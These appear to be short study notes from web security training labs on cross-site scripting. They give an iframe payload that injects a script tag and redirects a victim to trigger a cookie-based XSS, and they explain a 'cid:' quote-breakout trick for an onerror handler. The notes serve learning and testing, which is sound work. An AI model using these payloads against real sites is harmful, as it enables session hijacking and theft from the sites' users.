- Cookie based, there is page vulnerable to XSS but you can't exploit it unless you visit another page, so we use iframe to make user visit another page to trigger XSS.
```html
<iframe src="https://0ab5002e04da497b806d036e007700e5.web-security-academy.net/product?productId=8&%27%3E%3Cscript%3Eprint(1)%3C/script%3E"  onload='if(!window.x)document.location="https://0ab5002e04da497b806d036e007700e5.web-security-academy.net/product?productId=9";window.x=1;'>
```

- if you have something like `<img src="' + Controlled + '>"`, when you send payload as `x" onerror="alert(1)` it won't work as you want because it will consider the whole value as string because it use `toString()` in concatenation. you can use `cid:&quot;onerror=alert(1)//`
	-  **If you use `href="x"`**: The browser resolves it to the full path of the current page (e.g., `https://lab-id.net/x`).
	    - _Resulting HTML:_ `src="https://lab-id.net/x" onerror=..."` → **Fails** (The breakout doesn't work because the quote `"` is now part of the URL path).
	- **If you use `href="cid:..."`**: Most browsers do not know how to "resolve" a `cid:` scheme to a web path. Because it is an unknown or non-hierarchical scheme, the browser just returns the **exact string** you typed.
	- The `toString()` will be called and everything will be the same, the only difference is how `src` will understand things that starts with `cid:`. in most cases it will reflect it as it is.
```js
var a = document.createElement('a');
a.href = "cid:test";
console.log(a.toString()); // Returns "cid:test"

a.href = "test";
console.log(a.toString()); // Returns "https://your-current-url.com/test"
```
